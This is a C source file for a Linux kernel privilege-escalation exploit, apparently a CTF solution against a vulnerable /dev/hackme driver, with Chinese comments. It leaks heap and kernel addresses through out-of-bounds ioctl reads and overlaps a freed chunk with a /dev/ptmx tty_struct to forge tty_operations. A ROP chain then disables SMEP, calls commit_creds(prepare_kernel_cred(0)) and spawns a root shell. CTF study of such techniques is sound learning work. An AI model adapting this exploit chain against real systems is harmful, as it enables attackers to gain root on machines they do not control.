#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define ALLOC 0x30000
#define DEL 0x30001
#define READ 0x30003
#define WRITE 0x30002

struct arg
{
	size_t idx;
	void *addr;
	long long len;
	long long offset;
};

void alloc(int fd,int idx,char *user,long long len)
{
	struct arg cmd;
	cmd.idx=idx;
	cmd.len=len;
	cmd.addr=user;
	ioctl(fd,ALLOC,&cmd);
}

void delete(int fd,int idx)
{
	struct arg cmd;
	cmd.idx=idx;
	ioctl(fd,DEL,&cmd);
}

void read_from_kernel(int fd,int idx,char *user,long long len,long long offset)
{
	struct arg cmd;
	cmd.idx=idx;
	cmd.len=len;
	cmd.addr=user;
	cmd.offset=offset;
	ioctl(fd,READ,&cmd);
}

void write_to_kernel(int fd,int idx,char *user,long long len,long long offset)
{
	struct arg cmd;
	cmd.idx=idx;
	cmd.len=len;
	cmd.addr=user;
	cmd.offset =offset;
	ioctl(fd,WRITE,&cmd);
}

void print_hex(char *buf,int size)
{
	int i;
	puts('==============================');
	printf("data :\n");
	for (i=0;i<(size/8);i++)
	{
		if (i%2 == 0) {
			printf("%d",i/2);
		}
		printf(" %16llx",*(size_t *)(buf+i*8));
		if (i%2==1) {
			printf("\n");
		}
	}
	puts('==============================');
}

size_t user_cs,user_ss,user_sp,user_rflags,user_gs,user_es,user_fs,user_ds;
void save_status(){
	__asm__("mov %%cs,%0\n"
		    "mov %%ss,%1\n"
		    "mov %%rsp,%2\n"
		    "pushfq\n"
		    "pop %3\n"
		    "mov %%gs,%4\n"
		    "mov %%es,%5\n"
		    "mov %%fs,%6\n"
		    "mov %%ds,%7\n"
		    ::"m"(user_cs),"m"(user_ss),"m"(user_sp),"m"(user_rflags),
		    "m"(user_gs),"m"(user_es),"m"(user_fs),"m"(user_ds)
		    );
	puts("[+] status has been saved.");
}
void sh(){
	system("sh");
	exit(0);
}

int (*commit_creds)(unsigned long cred);
unsigned long (*prepare_kernel_cred)(unsigned long cred);

void sudo(){
	commit_creds(prepare_kernel_cred(0));
	asm(
		"push %0\n"
		"push %1\n"
		"push %2\n"
		"push %3\n"
		"push %4\n"
		"push $0\n"
		"swapgs\n"
		"pop %%rbp\n"
		"iretq\n"
		::"m"(user_ss),"m"(user_sp),"m"(user_rflags),"m"(user_cs),"a"(&sh)
		);
}

int main(){
	save_status();
	int fd=open("/dev/hackme",0);
	char *mem=malloc(0x2000);
	memset(mem,'A',0x2000);
	size_t heap_addr,kernel_addr,mod_addr;
	if (fd<0){
		printf("[-] bad open ?dev/hackme\n");
		exit(-1);
	}
// step 1 : 泄露堆地址，利用内核堆块的fd指针。堆地址方便以后布置tty_struct等结构
	alloc(fd,0,mem,0x400);
	alloc(fd,1,mem,0x400);
	alloc(fd,2,mem,0x400);
	alloc(fd,3,mem,0x400);
	alloc(fd,4,mem,0x400);
	alloc(fd,5,mem,0x400);
	printf("[+] create finished\n");
	delete(fd,2);
	delete(fd,4);

	read_from_kernel(fd,5,mem,0x400,-0x400);
	heap_addr=*((size_t *)mem);
	printf("[+] heap addr : %16llx\n",heap_addr);

 // step 2: 泄露内核地址， 利用新分配的tty_struct和释放的chunk4空间重叠。读取tty_operations指针。
	printf("[+] delete finished\n");
	int ptmx_fd=open("/dev/ptmx",O_RDWR|O_NOCTTY);
	if (ptmx_fd<0){
		printf("[-] bad open /dev/ptmx");
		exit(-1);
	}
	printf("[+] ptmx fd : %d\n",ptmx_fd);

	read_from_kernel(fd,5,mem,0x400,-0x400);
	if (*(size_t *)mem !=0x0000000100005401)
	{
		printf("[-] bad found ptmx");
		exit(-1);
	}

	kernel_addr= *((size_t *)(mem+0x18));
	if ((kernel_addr & 0xfff)!=0xd80){
		printf("[-] bad ptmx fops");
		exit(-1);
	}
	kernel_addr-=0x625d80;
	printf("[+] kernel addr : %16llx\n",kernel_addr);

 // step 3 : 布置tty_struct和tty_operations结构。
	prepare_kernel_cred=0x4d3d0+kernel_addr;
	commit_creds=0x4d220+kernel_addr;
	*((size_t *)(mem+0x18))=heap_addr-0x400+0x20;   //指向伪造的tty_operations
	//*((size_t *)(mem+0x38))=heap_addr-0x400+0x220;
	write_to_kernel(fd,5,mem,0x400,-0x400);
	printf("[+] finished overwrite fops\n");

    for(int j;j<0x10;j++){
		*((size_t  *)(mem+0x20+8*j)) = kernel_addr+0x200f66;    // gadget 2
	}

    *((size_t *)(mem+0x20+8*0))=kernel_addr+0x01b5a1; //pop rax; ret
    *((size_t *)(mem+0x20+8*1))=0x6f0;
    *((size_t *)(mem+0x20+8*2))=kernel_addr+0x252b; //mov cr4, rax; push rcx; popfq; pop rbp; ret;
    *((size_t *)(mem+0x20+8*3))=0xdeadbeef;
    //*((size_t *)(mem+0x20+8*4))=0xffffffff81078104;  //pop rax; pop rbp; ret; 
    *((size_t *)(mem+0x20+8*4))=sudo;
    *((size_t *)(mem+0x20+8*7))=kernel_addr+0x200f66;  // gadget 2

	write_to_kernel(fd,5,mem,0x400,0);
	getchar();
	//ioctl(ptmx_fd,0xdeadbeef,0xdeadbabe);
	char bufxx[0x8]={0};
	write(ptmx_fd,bufxx,8);
}


/*
Gadget:
	0xffffffff8101b5a1 : pop rax ; ret
	0xffffffff8100252b : mov cr4, rax ; push rcx ; popfq ; pop rbp ; ret
	0xffffffff81078104: pop rax; pop rbp; ret; 

gadget 2:
.text:0000000000200F66                 mov     rsp, rax
.text:0000000000200F69                 jmp     loc_200EE7

.text:0000000000200EE7                 pop     r12
.text:0000000000200EE9                 mov     rdi, rsp
.text:0000000000200EEC                 call    sub_16190
.text:0000000000200EF1                 mov     rsp, rax
.text:0000000000200EF4                 lea     rbp, [rsp+70h+var_6F]
.text:0000000000200EF9                 push    r12
.text:0000000000200EFB                 retn

回去再用ropper找一找这个gadget。
本题找不到 // mov rsp,rax ; dec ebx ; ret 这个gadget,所以不能劫持tty_operations 中的
write函数，直接劫持ioctl。
学到了一个新姿势，劫持ioctl。


*/
